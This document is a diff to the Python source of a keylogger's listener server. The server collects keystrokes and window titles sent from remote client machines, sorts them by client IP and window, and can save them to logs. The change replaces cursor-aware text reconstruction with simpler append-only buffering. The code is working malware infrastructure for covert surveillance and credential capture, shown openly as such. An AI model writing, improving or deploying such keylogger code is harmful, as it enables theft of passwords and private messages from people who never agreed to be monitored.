@@ -41,10 +41,10 @@ class KeyloggerListener:
         self.running = False
         self.sessions = {}
 
-        # Track window history and text buffers per client
+        # Track window history and text buffers per client (simplified - append only)
         self.client_windows = {}  # {client_ip: current_window}
         self.window_buffers = {}  # {client_ip: {window: text_buffer}}
-        self.cursor_positions = {}  # {client_ip: {window: cursor_position}}
+
 
         if use_encryption and encryption_key:
             self.cipher = Fernet(encryption_key.encode() if isinstance(encryption_key, str) else encryption_key)
@@ -167,23 +167,14 @@ class KeyloggerListener:
             if client_ip not in self.client_windows:
                 self.client_windows[client_ip] = None
                 self.window_buffers[client_ip] = {}
-                self.cursor_positions[client_ip] = {}
+
 
             # Check if window changed
             if self.client_windows[client_ip] != window:
                 # Display window separator
-                print(f"\n\n{'='*28}||  {window}  ||{'='*28}")
 
-                # Show previous content if returning to a known window
-                if window in self.window_buffers[client_ip]:
-                    previous_text = self.window_buffers[client_ip][window]
-                    cursor_pos = self.cursor_positions[client_ip].get(window, len(previous_text))
-                    if previous_text:
-                        # Display with cursor position marker
-                        display_text = previous_text[:cursor_pos] + '|' + previous_text[cursor_pos:]
-                        print(f"\n[CONTEXTE PRÉCÉDENT (| = position curseur)]:\n{display_text}", end='')
+                print(f"\n\n{'='*28}||  {window}  ||{'='*28}\n")
 
-                print()  # New line after header
 
                 # Update current window
                 self.client_windows[client_ip] = window
@@ -191,16 +182,12 @@ class KeyloggerListener:
                 # Initialize buffer for this window if needed
                 if window not in self.window_buffers[client_ip]:
                     self.window_buffers[client_ip][window] = ""
-                    self.cursor_positions[client_ip][window] = 0
 
-            # Get current buffer and cursor position
+            # Get current buffer (simplified append-only mode)
             buffer = self.window_buffers[client_ip][window]
-            cursor_pos = self.cursor_positions[client_ip].get(window, len(buffer))
 
-            # Ensure cursor is within bounds
-            cursor_pos = max(0, min(cursor_pos, len(buffer)))
+            # Process the keystroke - SIMPLIFIED VERSION
 
-            # Process the keystroke
             key_display = ''
             buffer_modified = False
 
@@ -209,127 +196,47 @@ class KeyloggerListener:
                 key_name = key.replace('Key.', '').upper()
 
                 if key_name == 'SPACE':
-                    # Insert space at cursor position
-                    buffer = buffer[:cursor_pos] + ' ' + buffer[cursor_pos:]
-                    cursor_pos += 1
+                    buffer += ' '
+
                     key_display = ' '
                     buffer_modified = True
 
                 elif key_name == 'ENTER':
-                    # Insert newline at cursor position
-                    buffer = buffer[:cursor_pos] + '\n' + buffer[cursor_pos:]
-                    cursor_pos += 1
+
+                    buffer += '\n'
+
                     print()
                     buffer_modified = True
 
                 elif key_name == 'BACKSPACE':
-                    # Delete character BEFORE cursor
-                    if cursor_pos > 0:
-                        deleted_char = buffer[cursor_pos - 1]
-                        buffer = buffer[:cursor_pos - 1] + buffer[cursor_pos:]
-                        cursor_pos -= 1
 
-                        # Display deleted character with strikethrough
-                        if deleted_char == '\n':
-                            key_display = '[⌫ENTER]'
-                        elif deleted_char == '\t':
-                            key_display = '[⌫TAB]'
-                        else:
-                            key_display = f'{deleted_char}\u0336'
-                        buffer_modified = True
-                    else:
-                        key_display = '[⌫]'
+                    # Just display the action
+                    key_display = ' [⌫] '
 
                 elif key_name == 'DELETE':
-                    # Delete character AFTER cursor
-                    if cursor_pos < len(buffer):
-                        deleted_char = buffer[cursor_pos]
-                        buffer = buffer[:cursor_pos] + buffer[cursor_pos + 1:]
-
-                        # Display deleted character with strikethrough
-                        if deleted_char == '\n':
-                            key_display = '[DEL→ENTER]'
-                        elif deleted_char == '\t':
-                            key_display = '[DEL→TAB]'
-                        else:
-                            key_display = f'[DEL→{deleted_char}\u0336]'
-                        buffer_modified = True
-                    else:
-                        key_display = '[DEL]'
+                    key_display = ' [DEL] '
 
                 elif key_name == 'LEFT':
-                    # Move cursor left
-                    if cursor_pos > 0:
-                        cursor_pos -= 1
-                        key_display = '←'
-                    else:
-                        key_display = '[←]'
+                    key_display = ' ← '
 
                 elif key_name == 'RIGHT':
-                    # Move cursor right
-                    if cursor_pos < len(buffer):
-                        cursor_pos += 1
-                        key_display = '→'
-                    else:
-                        key_display = '[→]'
+                    key_display = ' → '
 
                 elif key_name == 'UP':
-                    # Move cursor up (to previous line)
-                    lines_before = buffer[:cursor_pos].split('\n')
-                    if len(lines_before) > 1:
-                        current_line_pos = len(lines_before[-1])
-                        prev_line_len = len(lines_before[-2])
-                        # Move to same position in previous line, or end if shorter
-                        move_back = current_line_pos + 1 + min(current_line_pos, prev_line_len)
-                        cursor_pos = max(0, cursor_pos - move_back)
-                        key_display = '↑'
-                    else:
-                        # Already on first line, go to start
-                        cursor_pos = 0
-                        key_display = '[↑]'
+                    key_display = ' ↑ '
 
                 elif key_name == 'DOWN':
-                    # Move cursor down (to next line)
-                    remaining = buffer[cursor_pos:]
-                    if '\n' in remaining:
-                        lines_before = buffer[:cursor_pos].split('\n')
-                        current_line_pos = len(lines_before[-1])
-
-                        next_newline = remaining.index('\n')
-                        after_newline = buffer[cursor_pos + next_newline + 1:]
-
-                        if '\n' in after_newline:
-                            next_line_len = after_newline.index('\n')
-                        else:
-                            next_line_len = len(after_newline)
-
-                        # Move to same position in next line
-                        cursor_pos = cursor_pos + next_newline + 1 + min(current_line_pos, next_line_len)
-                        key_display = '↓'
-                    else:
-                        # Already on last line, go to end
-                        cursor_pos = len(buffer)
-                        key_display = '[↓]'
+                    key_display = ' ↓ '
 
                 elif key_name == 'HOME':
-                    # Move to start of line
-                    line_start = buffer[:cursor_pos].rfind('\n')
-                    cursor_pos = line_start + 1 if line_start >= 0 else 0
-                    key_display = '[HOME]'
+                    key_display = ' [HOME] '
 
                 elif key_name == 'END':
-                    # Move to end of line
-                    line_end = buffer[cursor_pos:].find('\n')
-                    if line_end >= 0:
-                        cursor_pos = cursor_pos + line_end
-                    else:
-                        cursor_pos = len(buffer)
-                    key_display = '[END]'
+                    key_display = ' [END] '
 
                 elif key_name == 'TAB':
-                    # Insert tab at cursor position
-                    buffer = buffer[:cursor_pos] + '\t' + buffer[cursor_pos:]
-                    cursor_pos += 1
+                    buffer += '\t'
+
                     key_display = '[TAB]'
                     buffer_modified = True
 
@@ -337,52 +244,20 @@ class KeyloggerListener:
                     # Other special keys (just display)
                     key_display = f'[{key_name}]'
             else:
-                # Regular character - insert at cursor position
-                buffer = buffer[:cursor_pos] + key + buffer[cursor_pos:]
-                cursor_pos += 1
+
+                # Regular character - add to buffer
+                buffer += key
                 key_display = key
                 buffer_modified = True
 
-            # Update buffer and cursor position
+            # Update buffer if modified
             if buffer_modified:
                 self.window_buffers[client_ip][window] = buffer
-            self.cursor_positions[client_ip][window] = cursor_pos
 
             # Display the character/action
             if key_display:
-                # For navigation keys, just show the arrow
-                if key_display in ['←', '→', '↑', '↓', '[HOME]', '[END]']:
-                    print(f' {key_display} ', end='', flush=True)
-                # For modifications or deletions, redisplay the entire line with cursor
-                elif buffer_modified or key_display.startswith('[DEL') or '\u0336' in key_display:
-                    # Show the deleted character
-                    if '\u0336' in key_display or key_display.startswith('[DEL'):
-                        print(f' {key_display} ', end='', flush=True)
+                print(key_display, end='', flush=True)
 
-                    # Clear line and redisplay buffer with cursor position
-                    # Use ANSI escape codes to clear the line
-                    print('\033[2K\r', end='')  # Clear entire line and return to start
-
-                    # Display buffer with cursor indicator
-                    if '\n' not in buffer:
-                        # Single line - display with cursor
-                        display_buffer = buffer[:cursor_pos] + '|' + buffer[cursor_pos:]
-                        print(f'{display_buffer}', end='', flush=True)
-                    else:
-                        # Multi-line - display last line with cursor
-                        lines = buffer.split('\n')
-                        current_line_index = buffer[:cursor_pos].count('\n')
-                        if current_line_index < len(lines):
-                            current_line = lines[current_line_index]
-                            # Calculate cursor position in current line
-                            line_start = sum(len(lines[i]) + 1 for i in range(current_line_index))
-                            cursor_in_line = cursor_pos - line_start
-                            display_line = current_line[:cursor_in_line] + '|' + current_line[cursor_in_line:]
-                            print(f'{display_line}', end='', flush=True)
-                        else:
-                            print(f'|', end='', flush=True)
-                else:
-                    print(key_display, end='', flush=True)
 
             if self.save_logs:
                 self._save_keystroke(keystroke, timestamp, client_address)
@@ -422,7 +297,8 @@ class KeyloggerListener:
             # Initialize tracking for this client
             self.client_windows[client_ip] = None
             self.window_buffers[client_ip] = {}
-            self.cursor_positions[client_ip] = {}
+
+
 
         elif msg_type == 'disconnect':
             session_data = message.get('data', {})
@@ -436,8 +312,7 @@ class KeyloggerListener:
                 del self.client_windows[client_ip]
             if client_ip in self.window_buffers:
                 del self.window_buffers[client_ip]
-            if client_ip in self.cursor_positions:
-                del self.cursor_positions[client_ip]
+
 
         elif msg_type == 'file':
             print(f"\n[FILE] File transmission from {client_ip} (not fully implemented in this handler)")
